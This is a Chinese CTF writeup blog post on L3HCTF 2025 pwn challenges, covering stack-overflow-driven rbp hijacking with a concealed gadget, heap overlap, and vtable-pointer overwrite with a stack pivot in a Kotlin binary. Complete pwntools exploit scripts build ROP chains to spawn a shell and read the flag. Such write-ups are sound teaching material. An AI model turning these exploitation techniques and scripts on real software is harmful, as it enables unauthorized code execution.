---
layout: post
title: "[Pwn] L3HCTF 2025 Pwn Writeup"
date: 2025-07-17 23:58 +0800

description: >-
  L3HCTF 2025 Pwn 方向 WriteUp，All Break SSS+ 101.0000%

categories: [CTF-Writeup | 非官方题解, Pwn-2025]
tags: [CTF, Pwn-Writeup, L3HCTF]
---

## Pwn 题解

### 1. Heack + Heack_Revenge

公众号引流：<span class="blackout" title="你知道的太多了">卧槽第一次打这么高他们竟然不发666淡泊名利</span>

<span class="blackout" title="你知道的太多了">如果你在别的地方看见了我的唐诗交给主办方的 wp，那你一定会觉得很唐，不过放心，</span>本次 WriteUp 均为赛后重写

#### 1-1 分析

十分完整的保护，注意，有 Canary

![image](https://webimage.lufiende.work/1752764978879.png)

包含两级菜单，第一级菜单包含两个重要的选项：**打龙** 和 **菜单堆入口**

![image](https://webimage.lufiende.work/1752764987665.png)

其中，打龙选项中有个十分明显的栈溢出，有一个循环读入输入不停，没有特别的边界读入数检查，并且控制读入的变量可以在该次读入中被修改，一旦该值被修改便可以在修改后的偏移继续写下去，从而造成一次从某位置开始不间断的越界写

![image](https://webimage.lufiende.work/1752764990673.png)

这意味着我们可以靠这里来修改返回地址，或者是 rbp 指针之类的……然后控制执行流

现在我们把目光投向堆功能部分

首先这个堆功能比较特殊，它引入了一个局部变量 s，**这个变量是 game 函数的第一个变量**

![image](https://webimage.lufiende.work/1752764992923.png)

在下文中，这块内容被用于存放堆地址，根据基本常识，可以得知，堆地址起始地址是紧邻进入**任何一级菜单的二级函数**（打龙和堆功能）之后函数的返回值之后的

堆方面只能说没有漏洞点，唯一不同寻常的只有堆地址在栈上

<span class="blackout" title="你知道的太多了">最坑爹的来了，孩子</span>

![image](https://webimage.lufiende.work/1752764998101.png)

你看见这三个数字了吗？很好，你是不觉得他们没什么用，看起来是这样子的，但是，他为什么会放在这里两个数字异或一下才输出这个 20250712 数字呢？

![image](https://webimage.lufiende.work/1752765003735.png)

实际上 5D 是 `pop rbp` 的汇编，你如果把这一段在 IDA 转化成未定义，从 5D 开始转成函数的话可以看到下面多出一个，这也是出题人最不当人的地方，当时还被卡了好久

![image](https://webimage.lufiende.work/1752765005376.png)

结合这个神人 `gadget` 和上文的 `堆地址紧邻返回地址之后` 我们可以实现以下操作：

众所周知，一些局部变量的空间是在栈上直接在进入函数时规划好的，而寻找对应变量在栈上是根据 rbp 进行偏移得到的，一旦我们控制了 rbp，我们就可以控制一些需要传入函数的参数，例如这三个变量

![image](https://webimage.lufiende.work/1752765011322.png)

以 `v1` 举例，这里 `var_30` 其实就是 `rbp - 0x30` ，只要我们利用好这个，如果我们把 rbp 劫持成为某个堆地址，那么只要它的前 0x30 偏移位置有相关地址就可以泄露，这里的话我们可以通过从释放的大堆申请小堆的方式控制对应偏移残留指针泄露 `libc`

![image](https://webimage.lufiende.work/1752765014432.png)

对应的，如果函数正常退出，完成了 `leave; retn;` 这个动作，那么可以视为一次成功的栈迁移，我们的执行流就可以进入到我们劫持的 `rbp + 8` 的位置，我们只要在对应位置布置好 ROP 链即可

不过在这道题中，你需要选择合适的变量来泄露，因为 `rbp - 0xC` 正好在我们的 `prev_size` 位置，正常来说泄露肯定是一个被释放且可以合并的堆块，如果你不管它的话，你在后续写执行流会在重新申请堆块出现问题，下面是正常状态的堆块，这种情况肯定过不了检查

![image](https://webimage.lufiende.work/1752765017868.png)

所以我们得借助其他的功能来修改堆的结构，这里出题人留下了能让我们修改局部变量的功能，利用这个我们可以尝试修改堆的头部，构造堆重叠，绕过那个被修改的部分

![image](https://webimage.lufiende.work/1752765019987.png)

也就是说我们让被释放的堆块头位置对应上这里的 n0xFFFF 就可以控制堆块头部，构造一个重叠堆，还能不影响 v3 泄露

![image](https://webimage.lufiende.work/1752765022873.png)

相应的，我们需要在下面的堆块布置 `prev_size` 

```python
add(5, 0x600, b'555')
add(0, 0x77, b'1' * 0x70 + p64(0xa0)) # 布置堆块
rm(5)
add(5, 0x5e0, b'555') # 比大堆小一些，空出 smallbin 空间
add(6, 0x600, b'666') # 变成 smallbin
```

这样的话，我们只要申请一个 0x10 的堆块就能把这个申请回来，释放在申请就能写入 rop 链，注意偏移

---

不过话又说回来了，这是标准解法，但是第一个出的时候因为那个溢出点没有限制，还能无限进入，那么泄露，写入 rop 链就可以在那一次操作完成

打龙函数返回时，寄存器现状

![image](https://webimage.lufiende.work/1752765036167.png)

众所周知，`printf()` 函数的参数非常多，而我们的 `rsi` 已经有一个 `libc` 地址，如果我们跳转到传入 `rdi` 格式化字符并执行 `printf()` 时就能泄露，就是这里

![image](https://webimage.lufiende.work/1752765033152.png)

执行到这就会打印基地址

![image](https://webimage.lufiende.work/1752765036167.png)

需要爆破一位，但不是什么大事情，拿到地址去栈溢出那里写 rop 链就行

#### 1-2 Exp

正攻方法

````python
#!/usr/bin/env python3

'''
    author: lufiende
    time: 2025-07-05 10:39:11
'''
from pwn import *
import os
import sys
import time
from ctypes import *

# For local
filename = "vul2_patched"
libcname = "/home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"

# For remote
host = "127.0.0.1"
port = 1337

# For docker
container_id = ""
proc_name = ""

# For GDB
isAttach = 0
gdbscript = '''
b main
b *$rebase(0x17ff)

set debug-file-directory /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug
set directories /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/glibc-source_2.39-0ubuntu8.4_all/usr/src/glibc/glibc-2.39
'''

# For Elf info
filearch = 'amd64'
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe', '-d', 'Kali-linux', '-u', 'lufiende']

# Load the binary
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

# Set up start function
def start():
    if args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)
    pause()

io = start()

######################### Your Code Here #########################

def cho(num):
    io.sendlineafter(b'>', str(num).encode())

def cho2(num):
    io.sendlineafter(b'opt', str(num).encode())


def add(idx,size,con):
    cho(5)
    cho2(1)
    io.sendlineafter(b'ndex', str(idx).encode())
    io.sendlineafter(b'size', str(size).encode())
    io.sendlineafter(b'content:', con)
    cho2(4)

def rm(idx):
    cho(5)
    cho2(2)
    io.sendlineafter(b'ndex', str(idx).encode())
    cho2(4)

def fight(con):
    cho(1)
    io.sendlineafter(b'shou', con)

def show():
    cho(4)

def train():
    cho(2)

add(5, 0x600, b'555')
add(0, 0x77, b'1' * 0x70 + p64(0xa0))
rm(5)
add(5, 0x5e0, b'555')
add(6, 0x600, b'666')

payload1 = b'a' * 259 + b'\x17' + b'\x59' 
fight(payload1) 

show()
io.recvuntil(b'[Attack]: ')
libc_leak = int(io.recvuntil(b'\n'))
log.info(f'libc leak: {hex(libc_leak)}')
libc_base = libc_leak - (0x7a4d71403b30 - 0x7a4d71200000)
log.info(f'libc base: {hex(libc_base)}')

for i in range(8): # 头部写成 0xa1
    train()

pop_rdi = libc_base + 0x000000000010f75b
retn = pop_rdi + 1
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh')) 

payload2 = b'a' * 0x28
payload2 += p64(retn) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

add(9, 0x10, b'999') # 申回构造堆并修改
rm(9)
add(9, 0x90, payload2)

cho(1145)
io.sendline(b'cat flag')

##################################################################


io.interactive()
````

邪道，但是 revenge 用不了

```python
#!/usr/bin/env python3

'''
    author: lufiende
    time: 2025-07-05 10:39:11
'''
from pwn import *
import os
import sys
import time
from ctypes import *

# For local
filename = "vul2_patched"
libcname = "/home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"

# For remote
host = "127.0.0.1"
port = 1337

# For docker
container_id = ""
proc_name = ""

# For GDB
isAttach = 0
gdbscript = '''
b main
b *$rebase(0x17ff)

set debug-file-directory /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug
set directories /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/glibc-source_2.39-0ubuntu8.4_all/usr/src/glibc/glibc-2.39
'''

# For Elf info
filearch = 'amd64'
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe', '-d', 'Kali-linux', '-u', 'lufiende']

# Load the binary
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

# Set up start function
def start():
    if args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)
    pause()

# io = start()

######################### Your Code Here #########################

def cho(num):
    io.sendlineafter(b'>', str(num).encode())

def cho2(num):
    io.sendlineafter(b'opt', str(num).encode())


def add(idx,size,con):
    cho(5)
    cho2(1)
    io.sendlineafter(b'ndex', str(idx).encode())
    io.sendlineafter(b'size', str(size).encode())
    io.sendlineafter(b'content:', con)
    cho2(4)

def rm(idx):
    cho(5)
    cho2(2)
    io.sendlineafter(b'ndex', str(idx).encode())
    cho2(4)

def fight(con):
    cho(1)
    io.sendlineafter(b'shou', con)

def show():
    cho(4)

def train():
    cho(2)

# add(5, 0x600, b'555')
# add(0, 0x77, b'1' * 0x70 + p64(0xa0))
# rm(5)
# add(5, 0x5e0, b'555')
# add(6, 0x600, b'666')

while True:
    try:
        io = start()

        payload1 = b'a' * 259 + b'\x17' + b'\x1a' + b'\x19' 
        fight(payload1) 

        # show()
        io.recvuntil(b'[Attack]: ')
        libc_leak = int(io.recvuntil(b'\n'))
        log.info(f'libc leak: {hex(libc_leak)}')
        libc_base = libc_leak - (0x7c8358404643 - 0x7c8358200000)
        log.info(f'libc base: {hex(libc_base)}')

        # for i in range(8): # 头部写成 0xa1
        #     train()

        pop_rdi = libc_base + 0x000000000010f75b
        retn = pop_rdi + 1
        system_addr = libc_base + libc.symbols['system']
        binsh_addr = libc_base + next(libc.search(b'/bin/sh')) 

        ropchain = p64(retn) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
        payload2 = b'a' * 259 + b'\x17' + ropchain
        fight(payload2) 

        io.interactive()
        

    except EOFError:
        io.close()
    


# payload2 = b'a' * 0x28
# payload2 += p64(retn) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

# add(9, 0x10, b'999') # 申回构造堆并修改
# rm(9)
# add(9, 0x90, payload2)

# cho(1145)

# io.sendline(b'cat flag')

##################################################################


# io.interactive()
```

### 2. Library

环境最不好把握的一集<span class="blackout" title="你知道的太多了">，本题的堆，额，类似堆的东西不懂 Kotlin </span>在本地大小有几率是随机化的，在 docker 环境中固定大小 0x240000 ，但是远端不一定打得通<span class="blackout" title="你知道的太多了">我那天半夜打第三个靶机怎么都打不通，换了一个打通了</span> <span class="blackout" title="你知道的太多了">后续：本地和 docker 只有偏移区别，估计是那天太晚不小心改错哪个地方，本来想开摆的结果队友奋发图强喊着什么友情啊什么羁绊啊狂冲榜所以只能硬啃下来了</span>

#### 2-1 分析

没 PIE 和 Canary，但是

![image](https://webimage.lufiende.work/1752765038115.png)

打开 IDA<span class="blackout" title="你知道的太多了">，噢噢噢噢噢噢噢噢噢噢噢噢噢噢噢噢卧槽这都是什么，全是洋人字我怎么看不懂</span>，拿 IDA 找一下主函数在哪，按下 `shift + f12` 卧槽什么都没有怎么办？<span class="blackout" title="你知道的太多了">静态分析个蛋，你看得懂你牛逼</span>

如果你真想静态找，按下 `shift + f12` 之后右击一个字符串选择 `setup` ，把下面的勾上

![image](https://webimage.lufiende.work/1752765044020.png)

然后就能找到了

![image](https://webimage.lufiende.work/1752765048759.png)

主函数在 sub_23B9B0() <span class="blackout" title="你知道的太多了">找到又能怎么样？</span>

有的时候还得亲手测试，使用 GDB 乖乖动调

![image](https://webimage.lufiende.work/1752765050920.png)

通过测试，大致可以推测出选项功能，这里四个选择比较重要，这四个从上到下可以理解为：Add，Delete，Edit，Show，其中没有 Index，只是依靠书名来对相关堆块进行申请和释放操作，而 Show 可以显示所有添加的书的名字

实际上除了 Edit 都没什么玩的，我们可以瞎玩研究一下 Edit 功能，如果你是高手，很容易就发现华点

![image](https://webimage.lufiende.work/1752765053092.png)

这个 Edit 功能在添加释放全靠书名的时候搞了一个靠 Index 和 page 索引的 Edit，而且看起来它的限制很宽容，约等于没有，这个时候我们就要乱写一通看看会发生什么

观察写入不同偏移的情况

```python
io = start()

add('maimaima')
add('chunithm')

edit(0, 0, p64(0x114514))
edit(0, 2, p64(0x114514))
edit(0, 4, p64(0x114514))
edit(0, 6, p64(0x114514))


io.interactive()
```

发现它总是有序的排列在一个内存页，大概是这个程序的堆，还有蜜汁小地址

![image](https://webimage.lufiende.work/1752765056034.png)

发现只针对 Index 为 0 的堆上 Edit 的偏移控制是以 8 位为一个单位进行偏移的，可以满足绝大部分控制需求

接下来观察每一偏移更改的情况

```python
for i in range(10):
    io = start()

    add('maimaima')
    add('chunithm')

    edit(0, i, p64(0x114514))
    
    io.interactive()
```

首先只要乱改，在程序等待输入的时候时会影响 GC 垃圾回收线程，出现各种错误，不过没什么用

![image](https://webimage.lufiende.work/1752765058886.png)

![image-20250717203540637](https://webimage.lufiende.work/1752765745728.png)

我们把目光放到我们所谓的堆上

![image-20250717204706854](https://webimage.lufiende.work/1752765753395.png)

如果你足够敏锐，你可以发现他们就是你命名的堆的名字，还有蜜汁自指小指针，观察这个蜜汁小指针，你会发现在看起来发挥不同作用的区域有不同的蜜汁小指针，想知道他们是干什么的，改掉他们看看会发生什么就行了，这里就改这个 `0x2623b0`

![image-20250717210046616](https://webimage.lufiende.work/1752765755752.png)

这下就能明白这个是什么了，这个自指的指针就像虚表一样，能够执行该地址偏移固定位置的函数，我们看一眼蜜汁指针所在上下文，对应位置有一个可执行地址，符合我们的猜想

![image-20250717210248950](https://webimage.lufiende.work/1752765759708.png)

到这里，我们相当于获得了一个权力，即执行一个地址对应的指令，就可以 Getshell 

同时，因为每次写都会残留蜜汁小指针，可以写到我们原有的堆名称覆盖，借此泄露 `libc` ，不过值得关注的是，这里的双字用了 `Unicode` ，而终端大部分是 `UTF-8` ，需要编码转换一下，不过因此我们可以泄露基地址

```python
add('maimaima')
add('chunithm')


edit(0, 15, p64(0x114514))
show()

io.recvuntil(b"[")
leak = io.recvuntil(b"]")
leak = leak.decode('utf-8')[4:-12]
# 将每个字符转换为4位16进制后，按小端序倒序排列
leak_unicode = ''.join(f"{ord(c):04x}" for c in reversed(leak))
leak_off = 0x7c663ceaaa26 - 0x7c663ce00000
libc_addr = int(leak_unicode,16) - leak_off
log.info(f"libc_addr: {hex(libc_addr)}")
```

![image-20250717210938229](https://webimage.lufiende.work/1752765763594.png)

同时，因为堆块区域在 libc 的上方，相当于泄露了堆地址

对于本地来说，堆地址会有随机化，本地测会在 0x40000 - 0x240000 变化，本地打可以小爆一下，远程貌似偏移固定 0x240000 ，对于远程直接计算即可，本地实际表现为后三位固定，**下文可能会用 base(110) 来表示堆上位置，且数字为 16 进制**

接下来我们就是寻找有什么能够劫持 rsp 到堆上的神奇 gadget，事实上还真有一个，**而且只能使用 ropper 找**

![image-20250717211744703](https://webimage.lufiende.work/1752765764194.png)

就是下面这个，把本来位于堆上装着 call 地址的 rax 赋值给 rsp，十分契合我们的需求，我们只需要根据这个布置堆就可以，以防万一，我们可以找个远点的地方，这里选择了 base(250)

我们想要执行 gadget ，就需要：

- 在 0x2623b0 上覆写 base(250) 作为假的偏移基址，有样学样，base(250) 写上自己
- 在 base(2d8) 上覆写 gadget 地址，2d8 即 250 + 88，可以利用上文的利用点执行 gadget，此时 rax 为 base(250)，会变成 rsp，rdi 是第一次写 base(250) 的地址，需要写一个堆上地址方便下一步跳转，这里取了 base(200)
- 那么 base(218) 需要写一个 pop xxx; retn 来执行 base(258) 上的 gadget
- 完成上一条之前在 base(258) 写好 gadget

手法可参考：

![image-20250717224736673](https://webimage.lufiende.work/1752765768437.png)

#### 2-2 Exp

```python
#!/usr/bin/env python3
from pwn import *

filename = "library_patched"
libcname = "/home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 5556
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b *0x23060d
set debug-file-directory /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug
set directories /home/lufiende/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/glibc-source_2.39-0ubuntu8.4_all/usr/src/glibc/glibc-2.39
'''
# b *0x227ec0
context(arch='amd64', os='linux')
context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)

def cho(choice):
    io.sendlineafter(b"choice:", str(choice).encode())

def add(name):
    cho(1)
    io.sendlineafter(b"borrow?", name.encode())

def rm(name):
    cho(2)
    io.sendlineafter(b"rn?", name.encode())

def edit(idx, off, content):
    cho(3)
    io.sendlineafter(b"read?", str(idx).encode())
    io.sendlineafter(b"page:", str(off).encode())
    io.sendafter(b"write:", content)

def show():
    cho(8)


while True:
    try:
        io = start()

        add('maimaima')
        add('chunithm')


        edit(0, 15, p64(0x114514))
        show()

        io.recvuntil(b"[")
        leak = io.recvuntil(b"]")
        leak = leak.decode('utf-8')[4:-12]
        # 将每个字符转换为4位16进制后，按小端序倒序排列
        leak_unicode = ''.join(f"{ord(c):04x}" for c in reversed(leak))
        leak_off = 0x7c663ceaaa26 - 0x7c663ce00000
        libc_addr = int(leak_unicode,16) - leak_off
        log.info(f"libc_addr: {hex(libc_addr)}")

        binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))
        system_addr = libc_addr + libc.symbols['system']
        pop_rdi = libc_addr + 0x000000000010f75b
        syscall = libc_addr + 0x0000000000098fb6
        pop_rax = libc_addr + 0x00000000000dd237
        pop_r13_r14_rbp = libc_addr + 0x000000000002b466
        pop_rsi_rbp = libc_addr + 0x2b46b
        og_off = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
        onegadget_addr = libc_addr + og_off[3]
        retn8 = libc_addr + 0x67e03
        push_rax_pop_rsp_lea_rsi_raxP0x48_mov_rax_rdiP8_jmp_raxP0x18 = libc_addr + 0x000000000016bdb0
        retn = pop_rdi + 1

        # fake_jmpchunk_addr = libc_addr - (0x723588c00000 - 0x723587b3e250) 本地用
        fake_jmpchunk_addr = libc_addr - (0x71621fae0000 - 0x71621ea1a250)
        # fake_jmpchunk_addr = fake_jmpchunk_addr - 0x80000

        edit(0, 13, p64(fake_jmpchunk_addr))
        edit(0, 84, p64(push_rax_pop_rsp_lea_rsi_raxP0x48_mov_rax_rdiP8_jmp_raxP0x18))

        edit(0, 14, p64(fake_jmpchunk_addr - 0x50))
        edit(0, 15, p64(0x114514))

        edit(0, 60, p64(pop_rdi))

        edit(0, 67, p64(fake_jmpchunk_addr))
        edit(0, 68, p64(retn))
        edit(0, 69, p64(pop_rdi))
        edit(0, 70, p64(binsh_addr))
        edit(0, 71, p64(system_addr)) 

        show()


        io.interactive()
        io.close()
    except EOFError:
        io.close()
    except KeyboardInterrupt:
        io.close()
        break
```

<span class="blackout" title="你知道的太多了">你说的对但是赛宁网安是不是要出事了（仅限 2025/7/17）</span>

```mermaid
graph TD
	D(运行 eBPF 程序流程)
	E[eBPF 虚拟机内部]-->|使用解释器解释\n支持 JIT 就执行机器码|F[（代码运行环境）]
	F-->H[10 个寄存器]
	H-->F
	F-->I[Map 存储]
	I-->F
	J[eBPF Map 相关系统调用]-->|创建|I
	F-->|bpf call|K[eBPF 相关函数（也是做题突破点）]
	K-->|返回值 / 对上下文进行操作|F
	L[eBPF 程序类型]-->|决定|K

